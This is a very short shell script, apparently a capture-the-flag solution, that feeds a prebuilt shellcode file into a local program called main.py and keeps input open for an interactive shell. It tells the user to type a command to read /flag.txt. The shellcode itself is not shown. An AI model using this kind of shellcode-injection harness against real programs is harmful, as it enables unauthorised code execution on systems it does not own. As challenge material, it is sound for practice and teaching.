#!/bin/sh

echo 'now type out /flag.txt and press enter'
(cat shellcode.bin; cat) | ../main.py
